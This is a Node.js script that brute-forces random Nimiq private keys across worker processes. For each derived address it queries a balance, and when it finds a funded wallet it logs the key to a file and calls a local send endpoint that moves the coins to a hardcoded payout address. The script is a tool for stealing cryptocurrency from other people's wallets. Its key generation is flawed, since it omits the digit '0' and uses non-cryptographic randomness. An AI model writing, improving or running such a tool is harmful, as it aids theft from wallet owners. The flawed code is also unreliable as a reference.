const cluster = require('cluster');
const fs = require('fs').promises;
const { default: axios } = require('axios');
const NimiqWallet = require('nimiqscan-wallet').default;
const EdDSA = require('elliptic').eddsa
const ec = new EdDSA('ed25519')
const argv = require('minimist')(process.argv.slice(2));

const BATCH_SIZE = 15; // Adjust batch size as needed
const numCPUs = argv.t || 4;
const payout = argv.u || "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03";

const Wallet = {
  fromPrivateKey: function(privateKeyHex) {
    const publicKeyArray = ec.keyFromSecret(privateKeyHex).getPublic()
    const publicKeyHex = Buffer.from(publicKeyArray).toString('hex')
    return NimiqWallet.fromMasterKey(privateKeyHex + publicKeyHex)
  }
}

const generateRandomPrivateKey = () => {
  const charset = '123456789abcdef';
  return Array.from({ length: 64 }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
};

const send = async (privateKey) => {
  try {
    const res = await axios.get(`http://127.0.0.1:8088/api/v1/send/${privateKey}/${payout}`);
    return res.data;
  } catch (error) {
    return null;
  }
};

const getBalance = async (address) => {
  try {
    const res = await axios.get(`http://127.0.0.1:8088/api/v1/balance/${address}`);
    return res.data.balance;
  } catch (error) {
    return -1;
  }
};

let founds = 0;

if (cluster.isMaster) {
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died`);
    cluster.fork(); // Restart the worker
  });
} else {
  const processBatch = async () => {
    const promises = [];
    for (let i = 0; i < BATCH_SIZE; i++) {
      const privateKeyHex = generateRandomPrivateKey();
      const wallet = Wallet.fromPrivateKey(privateKeyHex);
      const address = wallet.getAddress();

      promises.push(
        getBalance(address).then(async (balance) => {
          if (balance > 0) {
            founds++
            const successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
            await fs.appendFile('./matched.txt', successString);
            await send(privateKeyHex);
          }
          console.log(`\x1b[32mFounds: ${founds} | Wallet Check : ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
        })
      );
    }
    await Promise.all(promises);
  };

  const run = async () => {
    while (true) {
      await processBatch();
    }
  };

  run().catch(console.error);
}
